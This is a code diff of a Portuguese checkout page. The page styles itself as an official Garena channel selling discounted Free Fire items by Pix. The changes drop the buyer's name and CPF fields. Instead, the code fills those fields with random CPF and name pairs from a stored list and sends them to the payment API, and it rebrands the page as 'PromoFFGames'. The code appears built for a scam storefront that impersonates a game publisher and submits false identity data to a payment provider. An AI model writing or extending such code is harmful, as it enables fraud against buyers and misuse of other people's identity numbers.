@@ -31,19 +31,10 @@ const ADDRESSES = [
   { cep: "35162087", cidade: "Ipatinga", estado: "MG", bairro: "Iguaçu", rua: "Rua Magnetita" }
 ]
 
-// Função para gerar dados aleatórios
+// Função para gerar dados aleatórios (apenas telefone)
 const generateRandomUserData = () => {
   const randomEntry = FAKE_DATA[Math.floor(Math.random() * FAKE_DATA.length)]
   const [cpf, fullName] = randomEntry.split(':')
-  
-  // Gerar email baseado no nome
-  const nameParts = fullName.toLowerCase().split(' ')
-  const firstName = nameParts[0] || 'user'
-  const lastName = nameParts[nameParts.length - 1] || 'silva'
-  const cleanFirstName = firstName.normalize('NFD').replace(/[^a-z]/g, '')
-  const cleanLastName = lastName.normalize('NFD').replace(/[^a-z]/g, '')
-  const randomNumbers = Math.floor(100 + Math.random() * 900)
-  const email = `${cleanFirstName}.${cleanLastName}_${randomNumbers}@hotmail.com`
   
   // Gerar telefone válido aleatório
   const ddds = ['11', '21', '31', '41', '51', '61', '71', '81', '91']
@@ -66,9 +57,8 @@ const generateRandomUserData = () => {
   const randomAddress = ADDRESSES[Math.floor(Math.random() * ADDRESSES.length)]
   
   return {
-    fullName,
-    cpf,
-    email,
+    fullName, // Manter para compatibilidade com API
+    cpf, // Manter para compatibilidade com API
     phone,
     address: randomAddress
   }
@@ -374,7 +364,7 @@ export default function CheckoutPage() {
     { id: 'sombra-roxa', name: 'Sombra Roxa', image: '/images/sombraRoxa.png', oldPrice: 99.75, price: 9.99 },
     { id: 'barba-velho', name: 'Barba do Velho', image: '/images/Barba do Velho.png', oldPrice: 89.99, price: 10.99 },
     { id: 'pacote-coelhao', name: 'Pacote Coelhão', image: '/images/Pacote Coelhão.png', oldPrice: 49.29, price: 9.99 },
-    { id: 'calca-angelical', name: 'Calça Angelical Azul', image: '/images/Calça Angelical Azul.png', oldPrice: 129.90, price: 15.80 },
+    { id: 'calca-angelical', name: 'Calça Angelical Azul', image: '/images/Calça Angelical Azul.png', oldPrice: 129.90, price: 39.80 },
     { id: 'dunk-master', name: 'Dunk Master', image: '/images/Dunk Master.png', oldPrice: 75.90, price: 9.99 }
   ]
 
@@ -399,30 +389,23 @@ export default function CheckoutPage() {
     }
 
     // Validar campos obrigatórios
-    if (!fullName.trim()) {
-      alert("Por favor, preencha seu nome completo.")
-      return
-    }
-
-    if (!cpf.trim()) {
-      alert("Por favor, preencha seu CPF.")
-      return
-    }
-
     if (!email.trim()) {
       alert("Por favor, preencha o email para receber o comprovante.")
       return
     }
 
-    // Validar CPF
-    if (!validateCpf(cpf)) {
-      alert("Por favor, digite um CPF válido.")
+    // Validar formato de email
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+    if (!emailRegex.test(email)) {
+      alert("Por favor, digite um email válido.")
       return
     }
 
-    // Gerar apenas telefone e endereço aleatórios
+    // Gerar dados aleatórios para telefone, nome e CPF (para API)
     const randomData = generateRandomUserData()
     setPhone(randomData.phone)
+    setFullName(randomData.fullName)
+    setCpf(randomData.cpf)
 
     // Mostrar modal de promoção apenas para Free Fire
     if (config.showOrderBump) {
@@ -839,7 +822,7 @@ export default function CheckoutPage() {
     // Criar dados no formato do UTMify
     const utmifyData = {
         orderId: transactionData.transactionId,
-        platform: "RecarGames",
+        platform: "PromoFFGames",
         paymentMethod: "pix",
         status: "waiting_payment",
         createdAt: getBrazilTimestamp(),
@@ -933,7 +916,7 @@ export default function CheckoutPage() {
     // Criar dados no formato do UTMify
     const utmifyData = {
         orderId: transactionId,
-        platform: "RecarGames",
+        platform: "PromoFFGames",
         paymentMethod: "pix",
         status: "paid",
         createdAt: getBrazilTimestamp(),
@@ -1005,8 +988,8 @@ export default function CheckoutPage() {
       <div className="bg-white border-b border-gray-200 p-3 sm:p-4">
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-2 sm:gap-3">
-            <div className="w-8 h-8 sm:w-10 sm:h-10">
-              <img src="/images/garena-logo.png" alt="Garena Logo" className="w-full h-full object-contain" />
+            <div className="w-8 h-8 sm:w-10 sm:h-10 flex items-center justify-center bg-red-600 text-white font-bold rounded-full">
+              G
             </div>
             <div>
               <h1 className="font-bold text-base sm:text-lg text-gray-800">Canal Oficial de</h1>
@@ -1156,31 +1139,6 @@ export default function CheckoutPage() {
         <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-4 sm:p-6 mb-4 sm:mb-6">
           {!pixData ? (
             <div className="space-y-4">
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">Nome Completo *</label>
-                <input
-                  type="text"
-                  value={fullName}
-                  onChange={(e) => setFullName(e.target.value)}
-                  disabled={isProcessingPayment}
-                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
-                  placeholder="Seu nome completo"
-                />
-              </div>
-              
-              <div>
-                <label className="block text-sm font-medium text-gray-700 mb-1">CPF *</label>
-                <input
-                  type="text"
-                  value={cpf}
-                  onChange={handleCpfChange}
-                  disabled={isProcessingPayment}
-                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 disabled:bg-gray-100 disabled:cursor-not-allowed"
-                  placeholder="000.000.000-00"
-                  maxLength={14}
-                />
-              </div>
-              
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-1">Email para Comprovante *</label>
                 <input
@@ -1501,7 +1459,7 @@ export default function CheckoutPage() {
         <div className="container mx-auto max-w-5xl px-4">
           <div className="flex flex-col items-center gap-3 p-4 text-center text-xs md:items-start max-md:pb-5">
             <div className="flex flex-col items-center gap-3 leading-none md:w-full md:flex-row md:justify-between">
-              <div className="md:text-start">© 2025 Garena Online. Todos os direitos reservados.</div>
+              <div className="md:text-start">© 2025 PromoFFGames. Todos os direitos reservados.</div>
               <div className="flex shrink-0 flex-wrap items-center justify-center gap-x-4 gap-y-1">
                 <a href="#" className="transition-opacity hover:opacity-100 hover:text-white">FAQ</a>
                 <div className="h-3 w-px bg-white/30"></div>
